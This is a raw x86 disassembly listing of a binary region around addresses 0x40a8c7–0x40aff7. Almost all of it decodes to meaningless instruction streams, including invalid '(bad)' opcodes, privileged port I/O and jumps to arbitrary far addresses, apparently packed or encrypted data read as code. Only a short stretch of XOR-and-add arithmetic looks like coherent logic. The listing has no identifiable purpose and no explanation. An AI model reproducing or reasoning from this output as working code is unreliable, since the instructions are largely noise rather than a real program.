  40a8c7:	ins    DWORD PTR es:[edi],dx
  40a8c8:	int3   
  40a8c9:	sub    al,0x30
  40a8cb:	loop   0x40a854
  40a8cd:	aam    0x9e
  40a8cf:	lods   eax,DWORD PTR ds:[esi]
  40a8d0:	ss mov esp,0xe3c3cd05
  40a8d6:	js     0x40a8d4
  40a8d8:	cmp    ebp,DWORD PTR [edx-0x63c017b6]
  40a8de:	dec    edi
  40a8df:	(bad)  
  40a8e0:	ja     0x40a887
  40a8e2:	repnz mov bh,dh
  40a8e5:	sub    BYTE PTR [edx+0x21],ch
  40a8e8:	xlat   BYTE PTR ds:[ebx]
  40a8e9:	out    dx,al
  40a8ea:	mov    fs,WORD PTR [ebx-0x5f]
  40a8ed:	sub    DWORD PTR [edi-0x1e],eax
  40a8f0:	jge    0x40a92c
  40a8f2:	jmp    0x40a95a
  40a8f4:	fisttp WORD PTR [esi]
  40a8f6:	push   cs
  40a8f7:	jl     0x40a8f1
  40a8f9:	scas   eax,DWORD PTR es:[edi]
  40a8fa:	fninit 
  40a8fc:	mov    dl,0xef
  40a8fe:	sbb    eax,0x68ab62d9
  40a903:	jl     0x40a94f
  40a905:	repz dec BYTE PTR [ecx-0x18]
  40a909:	sbb    DWORD PTR [edi+0x49],ebx
  40a90c:	xchg   BYTE PTR [eax],dh
  40a90e:	add    dl,0x83
  40a911:	push   ecx
  40a912:	dec    ecx
  40a913:	push   cs
  40a914:	icebp  
  40a915:	xchg   edx,eax
  40a916:	jle    0x7005db2e
  40a91c:	mov    ds:0xd22c44b1,eax
  40a921:	xchg   edi,eax
  40a922:	imul   esp,DWORD PTR [edx+0x6429947],0x4a
  40a929:	mov    BYTE PTR [ebx],dh
  40a92b:	adc    ah,dl
  40a92d:	fcom   DWORD PTR [edi+edx*4-0x7b]
  40a931:	ins    BYTE PTR es:[edi],dx
  40a932:	out    0x97,al
  40a934:	ficom  WORD PTR [ecx]
  40a936:	cmp    al,0xe2
  40a938:	add    al,0xa9
  40a93a:	jae    0x40a8ff
  40a93c:	enter  0xaf8b,0x51
  40a940:	loope  0x40a983
  40a942:	jmp    0x40a965
  40a944:	cmp    al,0x69
  40a946:	sub    eax,0x409763ff
  40a94b:	mov    eax,cs
  40a94d:	and    eax,0xdf9a2160
  40a952:	cwde   
  40a953:	mov    ah,0x80
  40a955:	adc    DWORD PTR [eax],ecx
  40a957:	xchg   esp,eax
  40a958:	and    dh,bh
  40a95a:	(bad)  
  40a95b:	fbld   TBYTE PTR [ecx]
  40a95d:	and    BYTE PTR [edi+0x7a4307a0],bl
  40a963:	out    0xa9,eax
  40a965:	retf   0xbf76
  40a968:	sti    
  40a969:	fmul   QWORD PTR [edi-0x38]
  40a96c:	cli    
  40a96d:	sub    BYTE PTR [ebx],ah
  40a96f:	cld    
  40a970:	jmp    0x6b27:0xa871095d
  40a977:	aaa    
  40a978:	(bad)  
  40a979:	fmul   DWORD PTR [edx-0x80]
  40a97c:	arpl   WORD PTR [edi],bp
  40a97e:	mov    esi,0x91ec9ac6
  40a983:	sub    eax,0x9b1e03d
  40a988:	loopne 0x40a9a8
  40a98a:	cmp    DWORD PTR [edx+edx*2+0x64e9c2b3],ebp
  40a991:	in     al,0xac
  40a993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a994:	pop    edx
  40a995:	dec    esp
  40a996:	push   eax
  40a997:	cmp    al,0x24
  40a999:	stc    
  40a99a:	push   0x5d
  40a99c:	push   esi
  40a99d:	fucom  st(7)
  40a99f:	js     0x40a932
  40a9a1:	jbe    0x40a96b
  40a9a3:	clc    
  40a9a4:	jnp    0x40a971
  40a9a6:	lods   eax,DWORD PTR ds:[esi]
  40a9a7:	jne    0x40a9d6
  40a9a9:	sbb    cl,BYTE PTR [ebx]
  40a9ab:	and    esp,DWORD PTR [edi+0xb]
  40a9ae:	loop   0x40a9b5
  40a9b0:	cmp    bh,al
  40a9b2:	mov    edi,0xce0e9e9a
  40a9b7:	add    DWORD PTR [edx-0x43],ebx
  40a9ba:	push   eax
  40a9bb:	sub    edi,esi
  40a9bd:	(bad)  
  40a9be:	retf   
  40a9bf:	cmp    dh,dh
  40a9c1:	push   ds
  40a9c2:	test   DWORD PTR [esi+0x53],ebx
  40a9c5:	lods   eax,DWORD PTR ds:[esi]
  40a9c6:	and    BYTE PTR [edi],ch
  40a9c8:	popa   
  40a9c9:	and    BYTE PTR [eax+0x69],al
  40a9cc:	lea    ebx,[ebx+0x41]
  40a9cf:	dec    esi
  40a9d0:	push   cs
  40a9d1:	xlat   BYTE PTR ds:[ebx]
  40a9d2:	jg     0x40a98b
  40a9d4:	ins    DWORD PTR es:[edi],dx
  40a9d5:	out    dx,al
  40a9d6:	retf   0xf8e1
  40a9d9:	rol    BYTE PTR [eax],0xb
  40a9dc:	dec    ebp
  40a9dd:	adc    DWORD PTR [edx+0x1f],esi
  40a9e0:	fnsave [esi]
  40a9e2:	fisttp WORD PTR [ecx+0x2585f8f6]
  40a9e8:	push   0xf241be35
  40a9ed:	dec    ebp
  40a9ee:	cmp    dl,BYTE PTR [ebx-0x2b0451eb]
  40a9f4:	(bad)  
  40a9f5:	scas   al,BYTE PTR es:[edi]
  40a9f6:	popa   
  40a9f7:	mov    BYTE PTR [ebx],ah
  40a9f9:	les    esp,FWORD PTR [edi]
  40a9fb:	mov    fs,ebp
  40a9fd:	adc    bl,BYTE PTR [ebx]
  40a9ff:	call   0x6f0b:0xb80b9b08
  40aa06:	test   al,0x74
  40aa08:	arpl   WORD PTR [edx+0x27227c04],di
  40aa0e:	cmp    esp,DWORD PTR [ebx]
  40aa10:	or     al,0xe1
  40aa12:	stc    
  40aa13:	sub    DWORD PTR [edx-0x4f],0xe18737c5
  40aa1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa1b:	sub    DWORD PTR [esi-0x6002dc11],eax
  40aa21:	sahf   
  40aa22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa23:	adc    al,0xcf
  40aa25:	mov    BYTE PTR [edi+0x7e974010],0x2d
  40aa2c:	daa    
  40aa2d:	lock cmp DWORD PTR [ebx-0x3f8218b],esp
  40aa34:	or     al,0x1d
  40aa36:	xor    eax,DWORD PTR [eax+0x75]
  40aa39:	mov    dl,0x5d
  40aa3b:	or     al,0x81
  40aa3d:	cli    
  40aa3e:	cmp    bh,dh
  40aa40:	mov    edi,DWORD PTR [eax+0x73f106f5]
  40aa46:	lds    esi,FWORD PTR [ecx-0x58be72a4]
  40aa4c:	clc    
  40aa4d:	addr16 dec edi
  40aa4f:	mov    al,0x12
  40aa51:	loopne 0x40aac1
  40aa53:	mov    bh,0xab
  40aa55:	mul    bh
  40aa57:	push   ecx
  40aa58:	sub    edi,DWORD PTR [ebx+eiz*8-0x1cc45358]
  40aa5f:	pushf  
  40aa60:	cmp    ch,al
  40aa62:	(bad)  [ebx+0x6a]
  40aa65:	cdq    
  40aa66:	mov    esp,0xc2622f4b
  40aa6b:	scas   al,BYTE PTR es:[edi]
  40aa6c:	pop    ss
  40aa6d:	int    0x8c
  40aa6f:	mov    dl,0x41
  40aa71:	push   ds
  40aa72:	or     DWORD PTR [eax+0xbb2dbad],eax
  40aa78:	cmp    BYTE PTR [eax-0x73],bh
  40aa7b:	mov    ebp,0xb37dbde0
  40aa80:	mov    ds:0x1991800a,al
  40aa85:	stos   DWORD PTR es:[edi],eax
  40aa86:	adc    cl,BYTE PTR [esi-0x78]
  40aa89:	ficomp DWORD PTR [ebx-0x7d]
  40aa8c:	and    eax,0x283a4467
  40aa91:	push   edi
  40aa92:	scas   eax,DWORD PTR es:[edi]
  40aa93:	popf   
  40aa94:	loope  0x40aac3
  40aa96:	popf   
  40aa97:	enter  0x4d76,0x5a
  40aa9b:	xchg   esp,eax
  40aa9c:	pushf  
  40aa9d:	mov    esp,0x343c901f
  40aaa2:	sbb    cl,BYTE PTR [edi+0x6aeb95be]
  40aaa8:	mov    esi,0xa912f4c5
  40aaad:	dec    esp
  40aaae:	lahf   
  40aaaf:	xchg   BYTE PTR [esi+0x3746bdbf],al
  40aab5:	xchg   ecx,eax
  40aab6:	add    DWORD PTR [ebx+ebp*1],ecx
  40aab9:	cmp    BYTE PTR [ecx+0x4b906623],bl
  40aabf:	push   ss
  40aac0:	bound  esp,QWORD PTR [eax+0x7b670f07]
  40aac6:	push   cs
  40aac7:	mov    DWORD PTR [ecx],0x34700c57
  40aacd:	mov    bl,0x43
  40aacf:	add    BYTE PTR [ebp+ebp*1-0x2],ah
  40aad3:	mov    esi,0x72d25087
  40aad8:	cmp    eax,0x905a402f
  40aadd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aade:	jp     0x40aa82
  40aae0:	push   edi
  40aae1:	cdq    
  40aae2:	fdivp  st(3),st
  40aae4:	sti    
  40aae5:	fwait
  40aae6:	je     0x40aac7
  40aae8:	enter  0x2377,0xd
  40aaec:	dec    eax
  40aaed:	cmp    al,0xd4
  40aaef:	mov    BYTE PTR [edi-0x1b194613],dl
  40aaf5:	into   
  40aaf6:	mov    edx,0xaddc48bc
  40aafb:	push   es
  40aafc:	add    eax,0x44e751f1
  40ab01:	sti    
  40ab02:	push   ds
  40ab03:	neg    BYTE PTR [ebp*4-0x51686b11]
  40ab0a:	mov    cl,0x1b
  40ab0c:	je     0x40aaf3
  40ab0e:	add    ch,BYTE PTR [eax]
  40ab10:	adc    al,0x45
  40ab12:	cmp    BYTE PTR [ebp+0x46],ah
  40ab15:	push   es
  40ab16:	push   0xffffff8f
  40ab18:	repnz aaa 
  40ab1a:	aad    0x9f
  40ab1c:	mov    ah,0x35
  40ab1e:	mov    ecx,0x5f3f462f
  40ab23:	shr    DWORD PTR [edi-0x6e],0xae
  40ab27:	mov    ds:0x89025801,eax
  40ab2c:	sbb    ch,ch
  40ab2e:	ror    DWORD PTR [eax],cl
  40ab30:	inc    edx
  40ab31:	inc    esi
  40ab32:	xchg   BYTE PTR [eax+0x576abdd8],dh
  40ab38:	dec    edx
  40ab39:	mov    ah,0x6c
  40ab3b:	not    DWORD PTR [ebx]
  40ab3d:	inc    esp
  40ab3e:	push   edi
  40ab3f:	jne    0x40ab13
  40ab41:	std    
  40ab42:	in     eax,0xe5
  40ab44:	dec    esp
  40ab45:	stos   DWORD PTR es:[edi],eax
  40ab46:	push   edx
  40ab47:	fsubr  DWORD PTR [edx]
  40ab49:	mov    eax,ebx
  40ab4b:	pop    eax
  40ab4c:	mov    esi,0x76196522
  40ab51:	jae    0x40ab49
  40ab53:	inc    ebp
  40ab54:	(bad)  
  40ab55:	out    dx,eax
  40ab56:	push   esi
  40ab57:	outs   dx,BYTE PTR ds:[esi]
  40ab58:	mov    BYTE PTR [esi-0x21bc7fe4],bl
  40ab5e:	fs aam 0xa8
  40ab61:	mov    edx,0xe0b98
  40ab66:	push   esp
  40ab67:	imul   ecx,ebx,0xe2b8f77e
  40ab6d:	push   0x79d23485
  40ab72:	ror    DWORD PTR [edi-0x21897c80],cl
  40ab78:	xor    DWORD PTR [ebx+0x684360b8],ebx
  40ab7e:	sbb    DWORD PTR [edi+0x5f],eax
  40ab81:	xor    ch,BYTE PTR [ebx]
  40ab83:	dec    ebx
  40ab84:	jmp    0x91de:0xba013dd7
  40ab8b:	jge    0x40ab7d
  40ab8d:	fs call 0xcb4b5c63
  40ab93:	imul   ebx,DWORD PTR [ebx+0x7a],0x3432fd25
  40ab9a:	mov    eax,0x3714e759
  40ab9f:	adc    cl,BYTE PTR [ebp+eiz*2-0x4a632337]
  40aba6:	and    ch,bh
  40aba8:	bnd jae 0x40ab7a
  40abab:	sub    al,BYTE PTR [edi-0x28]
  40abae:	aas    
  40abaf:	xchg   esp,eax
  40abb0:	inc    esi
  40abb1:	int3   
  40abb2:	cmp    edx,DWORD PTR [eax+esi*8]
  40abb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abb6:	call   0xec61:0x9c31da43
  40abbd:	retf   
  40abbe:	ins    DWORD PTR es:[edi],dx
  40abbf:	pop    edi
  40abc0:	adc    DWORD PTR [eax+0x40bc0742],ecx
  40abc6:	pop    edx
  40abc7:	scas   al,BYTE PTR es:[edi]
  40abc8:	popf   
  40abc9:	fistp  QWORD PTR [eax+ebx*4-0x18df0357]
  40abd0:	or     dh,bh
  40abd2:	push   ecx
  40abd3:	retf   
  40abd4:	cmp    ecx,DWORD PTR [esp+edx*1-0x1e073b3e]
  40abdb:	mov    dl,0x19
  40abdd:	mov    dl,0xdf
  40abdf:	sub    eax,0xf2f5be7
  40abe4:	lds    eax,FWORD PTR [ecx+0x617b7df0]
  40abea:	mov    eax,ds:0x2014f46f
  40abef:	sub    ecx,DWORD PTR [ebx]
  40abf1:	imul   esi,ebp,0xffffffb7
  40abf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abf5:	rcl    al,1
  40abf7:	xor    al,0xd4
  40abf9:	dec    esp
  40abfa:	call   0xd6c84ce3
  40abff:	fstp   QWORD PTR [ebp-0x4e568e40]
  40ac05:	mov    ah,0x98
  40ac07:	ret    0xa6e6
  40ac0a:	push   edx
  40ac0b:	push   edx
  40ac0c:	pop    es
  40ac0d:	inc    eax
  40ac0e:	mov    bh,0x75
  40ac10:	test   eax,0x8fe76e56
  40ac15:	(bad)  
  40ac17:	rol    BYTE PTR [ebx+ebx*4],0x80
  40ac1b:	shl    BYTE PTR [ebx-0x2410bd34],0x3f
  40ac22:	lahf   
  40ac23:	mov    DWORD PTR [eax],ecx
  40ac25:	js     0x40ac7f
  40ac27:	leave  
  40ac28:	aad    0x6d
  40ac2a:	test   BYTE PTR [esi],bl
  40ac2c:	inc    ecx
  40ac2d:	mov    ah,0x70
  40ac2f:	add    eax,edi
  40ac31:	add    ebp,esi
  40ac33:	sahf   
  40ac34:	ror    BYTE PTR [ebp-0x17447d7e],0x2e
  40ac3b:	xchg   edi,eax
  40ac3c:	or     DWORD PTR [ebx],ebx
  40ac3e:	(bad)  
  40ac3f:	adc    edi,ebx
  40ac41:	xchg   ebp,eax
  40ac42:	pop    ss
  40ac43:	lods   eax,DWORD PTR ds:[esi]
  40ac44:	scas   eax,DWORD PTR es:[edi]
  40ac45:	mov    ch,0x94
  40ac47:	imul   ecx,DWORD PTR [ebp-0x42],0x33
  40ac4b:	jnp    0x40ac37
  40ac4d:	ficomp DWORD PTR [ebx]
  40ac4f:	or     ecx,esi
  40ac51:	shr    DWORD PTR [esi+0x3f],0x9c
  40ac55:	(bad)  
  40ac56:	les    esi,FWORD PTR [eax+0x4b]
  40ac59:	sti    
  40ac5a:	inc    ecx
  40ac5b:	mov    bl,0x7a
  40ac5d:	jg     0x40ac39
  40ac5f:	pop    ebx
  40ac60:	clc    
  40ac61:	adc    DWORD PTR [eax],0xe08deaf
  40ac67:	xchg   edx,eax
  40ac68:	dec    eax
  40ac69:	mov    dh,bh
  40ac6b:	sbb    cl,BYTE PTR [edx]
  40ac6d:	cwde   
  40ac6e:	je     0x40ac96
  40ac70:	cmp    al,BYTE PTR [eax]
  40ac72:	loopne 0x40ac8f
  40ac74:	add    bl,cl
  40ac76:	das    
  40ac77:	jne    0x40ac45
  40ac79:	idiv   DWORD PTR [ecx]
  40ac7b:	sbb    cl,BYTE PTR [ebx+0x24]
  40ac7e:	aaa    
  40ac7f:	scas   al,BYTE PTR es:[edi]
  40ac80:	sub    al,0x7d
  40ac82:	pop    eax
  40ac83:	xchg   edx,eax
  40ac84:	mov    ebx,0x4426ab7d
  40ac89:	push   es
  40ac8a:	sbb    eax,0x736665a5
  40ac8f:	cmp    al,0x51
  40ac91:	add    al,0xb6
  40ac93:	inc    ecx
  40ac94:	rcl    BYTE PTR [ebx+0x7ad35c7a],1
  40ac9a:	dec    edi
  40ac9b:	cmp    ebp,0x11bfbc4e
  40aca1:	repz lahf 
  40aca3:	sbb    eax,DWORD PTR [eax]
  40aca5:	out    0x6f,eax
  40aca7:	mov    WORD PTR [ebx-0x6e4e3ccd],ss
  40acad:	icebp  
  40acae:	push   cs
  40acaf:	or     BYTE PTR [esi-0x36],ah
  40acb2:	retf   0x25a6
  40acb5:	cwde   
  40acb6:	cmp    al,0x49
  40acb8:	sbb    DWORD PTR [ebp+esi*4+0xbe5bd10],esi
  40acbf:	adc    DWORD PTR [ebp+0x9381cb5],ebx
  40acc5:	mov    DWORD PTR [edi],ebp
  40acc7:	pop    edi
  40acc8:	mov    esi,0xe5141bd5
  40accd:	jno    0x40ac57
  40accf:	dec    esi
  40acd0:	mov    bh,0x9e
  40acd2:	loope  0x40acf9
  40acd4:	sub    dl,BYTE PTR [edx]
  40acd6:	add    al,0x76
  40acd8:	ret    0x2bef
  40acdb:	push   ds
  40acdc:	out    0x66,al
  40acde:	enter  0xeea1,0x8
  40ace2:	ins    DWORD PTR es:[edi],dx
  40ace3:	cmp    ebx,DWORD PTR [ebp-0x62]
  40ace6:	sbb    eax,DWORD PTR [ecx+0x78]
  40ace9:	int    0x20
  40aceb:	retf   
  40acec:	je     0x40ad63
  40acee:	inc    edx
  40acef:	(bad)  
  40acf0:	jl     0x40ad16
  40acf2:	mov    ss,WORD PTR [ecx-0x11]
  40acf5:	xchg   ebx,eax
  40acf6:	pushf  
  40acf7:	aad    0xdd
  40acf9:	loopne 0x40ad67
  40acfb:	sbb    eax,0x90e252dc
  40ad00:	pop    edx
  40ad01:	fdiv   DWORD PTR [edx-0x3]
  40ad04:	bound  edx,QWORD PTR [esi-0x4a]
  40ad07:	xchg   edi,eax
  40ad08:	inc    ebp
  40ad09:	or     BYTE PTR [edi+0x3b],cl
  40ad0c:	sub    BYTE PTR [ebp+0x7a],bh
  40ad0f:	(bad)  
  40ad10:	fcmovbe st,st(6)
  40ad12:	or     al,0xe7
  40ad14:	in     al,0x9c
  40ad16:	jnp    0x40ad94
  40ad18:	sar    cl,0xb3
  40ad1b:	aad    0xe8
  40ad1d:	jne    0x40acca
  40ad1f:	mov    esi,0x54258a34
  40ad24:	dec    ebx
  40ad25:	pop    esi
  40ad26:	xchg   edi,eax
  40ad27:	(bad)  
  40ad28:	xlat   BYTE PTR ds:[ebx]
  40ad29:	or     dl,BYTE PTR [esp+ecx*2-0x56e74abc]
  40ad30:	ror    BYTE PTR [ebx+0x5ae50123],1
  40ad36:	test   al,0xa9
  40ad38:	pop    ds
  40ad39:	jnp    0x40ad57
  40ad3b:	inc    ebp
  40ad3c:	sub    BYTE PTR [ebx+eax*8],bl
  40ad3f:	xlat   BYTE PTR ds:[ebx]
  40ad40:	cmp    eax,0x8de2fe6a
  40ad45:	cmp    BYTE PTR [ebx+0x37],0x27
  40ad49:	pop    ds
  40ad4a:	dec    edx
  40ad4b:	add    DWORD PTR [edi],esi
  40ad4d:	test   al,0x59
  40ad4f:	test   BYTE PTR [ebp-0x7a59f808],al
  40ad55:	pop    es
  40ad56:	or     BYTE PTR [esp+edi*1+0x0],cl
  40ad5a:	sub    al,0xc0
  40ad5c:	xor    ch,0x43
  40ad5f:	sbb    BYTE PTR [ebx+0x74b8b5d4],ch
  40ad65:	mov    ebx,0x75e6c405
  40ad6a:	sti    
  40ad6b:	dec    edx
  40ad6c:	fwait
  40ad6d:	sbb    al,0xd7
  40ad6f:	inc    ecx
  40ad70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad71:	ins    DWORD PTR es:[edi],dx
  40ad72:	jge    0x40adb2
  40ad74:	and    ebp,DWORD PTR [eax]
  40ad76:	scas   eax,DWORD PTR es:[edi]
  40ad77:	ds add eax,esi
  40ad7a:	xchg   BYTE PTR [eax],dl
  40ad7c:	pop    esp
  40ad7d:	adc    eax,0x75052145
  40ad82:	pushf  
  40ad83:	sub    al,BYTE PTR [ebx-0x62]
  40ad86:	inc    esp
  40ad87:	push   DWORD PTR [ecx]
  40ad89:	loop   0x40ada7
  40ad8b:	fs addr16 out dx,al
  40ad8e:	sub    DWORD PTR [ecx+ebp*2-0xc],esp
  40ad92:	or     al,al
  40ad94:	js     0x40ad4b
  40ad96:	retf   
  40ad97:	les    edi,FWORD PTR [ecx+0x5c]
  40ad9a:	xchg   ebx,eax
  40ad9b:	and    al,0x1a
  40ad9d:	jo     0x40adb8
  40ad9f:	mov    eax,ds:0x5d21494a
  40ada4:	dec    eax
  40ada5:	and    DWORD PTR [edi+edi*8-0x14],ecx
  40ada9:	or     DWORD PTR [ecx+0x20e682c6],0xffffff9d
  40adb0:	mov    ecx,0x70da9870
  40adb5:	mov    ds:0x667b1c59,al
  40adba:	sub    BYTE PTR [edx+0x5fb5feba],dh
  40adc0:	jecxz  0x40adde
  40adc2:	mov    bl,0x19
  40adc4:	mov    ds:0xa6cbe3d8,eax
  40adc9:	mov    eax,ds:0xe7d3e3e5
  40adce:	adc    BYTE PTR [esi],bl
  40add0:	gs xchg ebx,eax
  40add2:	popa   
  40add3:	adc    al,0xec
  40add5:	movaps XMMWORD PTR [eax+0x73],xmm3
  40add9:	call   0x5d5f:0xb5bab461
  40ade0:	fs mov ss,ecx
  40ade3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ade4:	daa    
  40ade5:	add    bh,BYTE PTR [edx-0x1856afad]
  40adeb:	add    dh,BYTE PTR [ebx+0x60094e29]
  40adf1:	sbb    eax,0xd08ef139
  40adf6:	sub    cl,ch
  40adf8:	outs   dx,BYTE PTR ds:[esi]
  40adf9:	(bad)  
  40adfa:	int    0xae
  40adfc:	into   
  40adfd:	cmp    eax,0xc7e6c37a
  40ae02:	or     eax,0x996be980
  40ae07:	xor    al,0x86
  40ae09:	out    dx,al
  40ae0a:	inc    ecx
  40ae0b:	lock mov gs,WORD PTR [edx]
  40ae0e:	xchg   ebp,eax
  40ae0f:	pop    esp
  40ae10:	into   
  40ae11:	lahf   
  40ae12:	loope  0x40ae57
  40ae14:	jnp    0x40ae0c
  40ae16:	mov    eax,ds:0x1c480725
  40ae1b:	cmp    bl,BYTE PTR [ebx]
  40ae1d:	sub    ecx,DWORD PTR [ecx+ebx*2]
  40ae20:	rcl    BYTE PTR [ebp+esi*2-0x43],cl
  40ae24:	ja     0x40ae33
  40ae26:	mov    WORD PTR [edx],ss
  40ae28:	jmp    0x549025b
  40ae2d:	mov    ds:0x1ea9acb1,al
  40ae32:	jb     0x40ae67
  40ae34:	lds    esp,FWORD PTR [ecx]
  40ae36:	daa    
  40ae37:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40ae39:	dec    edi
  40ae3a:	dec    edx
  40ae3b:	loop   0x40ae61
  40ae3d:	mov    edi,0x8946480f
  40ae42:	push   ss
  40ae43:	sbb    ch,BYTE PTR [edi-0x58696925]
  40ae49:	sbb    edx,DWORD PTR [edx+edi*1]
  40ae4c:	sub    BYTE PTR [ecx],bh
  40ae4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae4f:	icebp  
  40ae50:	(bad)  
  40ae51:	je     0x40adf4
  40ae53:	sub    eax,0xfb65ab1c
  40ae58:	jp     0x40ae53
  40ae5a:	in     al,dx
  40ae5b:	std    
  40ae5c:	mov    ds:0x43775de0,eax
  40ae61:	xchg   dh,bl
  40ae63:	imul   ecx,DWORD PTR [edi-0x4b],0xffffff84
  40ae67:	cmp    bh,BYTE PTR [ecx+edi*4]
  40ae6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae6b:	add    DWORD PTR [edx+0x2f],edx
  40ae6e:	and    al,0xbf
  40ae70:	fwait
  40ae71:	inc    edi
  40ae72:	loopne 0x40aeaa
  40ae74:	push   0x4b844c9a
  40ae79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae7a:	leave  
  40ae7b:	call   ebp
  40ae7d:	popa   
  40ae7e:	mov    edi,0x83712eac
  40ae83:	xchg   esp,eax
  40ae84:	xor    BYTE PTR [esi+0x1b18d4f2],al
  40ae8a:	ret    
  40ae8b:	rcr    bl,cl
  40ae8d:	and    DWORD PTR [ebx+0x16],ebx
  40ae90:	hlt    
  40ae91:	ret    0xded0
  40ae94:	jecxz  0x40aeb0
  40ae96:	xchg   ecx,eax
  40ae97:	jle    0x40aec4
  40ae99:	pop    ebp
  40ae9a:	mov    esi,DWORD PTR [eax]
  40ae9c:	jo     0x40aed2
  40ae9e:	(bad)  
  40ae9f:	add    DWORD PTR [eax+0x3531fd5a],0xffffffb6
  40aea6:	aas    
  40aea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aea8:	test   al,0x89
  40aeaa:	add    al,0x8a
  40aeac:	mov    eax,DWORD PTR [ebp-0xc]
  40aeaf:	mov    ecx,DWORD PTR [ebp+0x8]
  40aeb2:	xor    eax,esi
  40aeb4:	lea    eax,[eax+ecx*1+0x3272f8]
  40aebb:	mov    DWORD PTR [ebp+0x8],eax
  40aebe:	mov    eax,DWORD PTR [ebp-0xc]
  40aec1:	mov    ecx,DWORD PTR [ebp+0x14]
  40aec4:	xor    eax,esi
  40aec6:	add    eax,edi
  40aec8:	imul   eax,DWORD PTR [ecx]
  40aecb:	mov    ecx,DWORD PTR [ebp-0x4]
  40aece:	mov    edx,DWORD PTR [ebp+0x8]
  40aed1:	xor    ecx,esi
  40aed3:	jmp    0x40d273
  40aed8:	mov    WORD PTR [esi+edi*8+0x6c5d2edd],ds
  40aedf:	out    dx,al
  40aee0:	fwait
  40aee1:	push   edx
  40aee2:	(bad)  
  40aee3:	xor    edi,edi
  40aee5:	sub    al,0xf1
  40aee7:	fsubr  DWORD PTR [eax+ecx*1-0x61018485]
  40aeee:	jnp    0x40af6b
  40aef0:	push   ecx
  40aef1:	xchg   DWORD PTR [ebx-0x5a7cf574],ecx
  40aef7:	or     BYTE PTR [ecx+0x30],ah
  40aefa:	jg     0x40af5f
  40aefc:	cmp    ebp,DWORD PTR [ecx]
  40aefe:	lock out 0xa0,eax
  40af01:	in     eax,0x43
  40af03:	push   ebp
  40af04:	and    DWORD PTR [ebp+0x32a0026e],ebx
  40af0a:	std    
  40af0b:	scas   al,BYTE PTR es:[edi]
  40af0c:	dec    edi
  40af0d:	xor    BYTE PTR [eax+eiz*8],ch
  40af10:	repz xchg edx,eax
  40af12:	iret   
  40af13:	(bad)  
  40af14:	cmp    eax,0x23d117f6
  40af19:	or     BYTE PTR [edi-0x7e22f5f2],bl
  40af1f:	or     esp,DWORD PTR [esi-0x1a]
  40af22:	ins    BYTE PTR es:[edi],dx
  40af23:	and    eax,0x6d265f94
  40af28:	inc    esi
  40af29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af2a:	lds    eax,FWORD PTR [ebp-0xb]
  40af2d:	dec    esi
  40af2e:	mov    ebx,0x34be164d
  40af33:	hlt    
  40af34:	mov    BYTE PTR [edi],bh
  40af36:	or     dl,bh
  40af38:	sub    ah,BYTE PTR [eax+0x379e010]
  40af3e:	inc    esp
  40af3f:	push   ecx
  40af40:	xchg   BYTE PTR fs:[ecx-0x7fad67b1],ah
  40af47:	jle    0x40af81
  40af49:	sub    bh,ah
  40af4b:	pop    es
  40af4c:	ja     0x40af07
  40af4e:	ret    
  40af4f:	loope  0x40af25
  40af51:	fs icebp 
  40af53:	clc    
  40af54:	fisubr WORD PTR [ebx+esi*2]
  40af57:	pop    esp
  40af58:	xor    eax,0x24cb1794
  40af5d:	leave  
  40af5e:	xchg   esi,eax
  40af5f:	rcr    DWORD PTR [ecx-0x5c],0x89
  40af63:	sahf   
  40af64:	adc    al,0xf9
  40af66:	test   eax,0xf238ff4f
  40af6b:	xlat   BYTE PTR ds:[ebx]
  40af6c:	sbb    al,0xe1
  40af6e:	or     BYTE PTR [ebx+0x15c20f10],bh
  40af74:	mov    ds:0x6e079c33,al
  40af79:	adc    ecx,ebx
  40af7b:	adc    BYTE PTR [ebx],0xa
  40af7e:	retf   
  40af7f:	pop    edx
  40af80:	and    edi,DWORD PTR [edi-0x21]
  40af83:	xor    eax,0xa304a49c
  40af88:	push   ebx
  40af89:	pop    edx
  40af8a:	imul   edi,DWORD PTR [esi],0x3620ea60
  40af90:	es (bad) 
  40af92:	jmp    0x3f5a1499
  40af97:	popf   
  40af98:	cmc    
  40af99:	xlat   BYTE PTR ds:[ebx]
  40af9a:	loope  0x40afc0
  40af9c:	xlat   BYTE PTR ds:[ebx]
  40af9d:	out    dx,eax
  40af9e:	or     al,0xa4
  40afa0:	push   ebp
  40afa1:	inc    esi
  40afa2:	sub    edx,ebx
  40afa4:	in     al,0x27
  40afa6:	and    BYTE PTR gs:[bp+di+0x10a3],al
  40afac:	stc    
  40afad:	in     eax,0xed
  40afaf:	jbe    0x40afe1
  40afb1:	inc    esp
  40afb2:	arpl   bp,ax
  40afb4:	fldenv gs:[ebx+esi*4]
  40afb8:	mov    bl,0x12
  40afba:	pop    ecx
  40afbb:	jae    0x40afb5
  40afbd:	mov    edx,0xf5f935
  40afc2:	ret    
  40afc3:	sub    eax,0xcb932c6c
  40afc8:	add    edx,DWORD PTR [edi]
  40afca:	mov    ecx,0x3f191166
  40afcf:	jle    0x40afd3
  40afd1:	cmp    al,0xaa
  40afd3:	int3   
  40afd4:	out    0x86,al
  40afd6:	pop    eax
  40afd7:	jae    0x40afbb
  40afd9:	retf   0xd26d
  40afdc:	xor    edx,DWORD PTR [edi+0x2f50a36f]
  40afe2:	stos   BYTE PTR es:[edi],al
  40afe3:	test   al,0x5a
  40afe5:	mov    edi,0xf81b2f9c
  40afea:	sbb    cl,BYTE PTR [edi+0x6d]
  40afed:	sbb    DWORD PTR [ecx],ebp
  40afef:	(bad)  
  40aff0:	out    0xdc,eax
  40aff2:	fucomip st,st(1)
  40aff4:	jb     0x40b050
  40aff6:	pop    edi
  40aff7:	add    DWORD PTR [esi-0x47],ebx
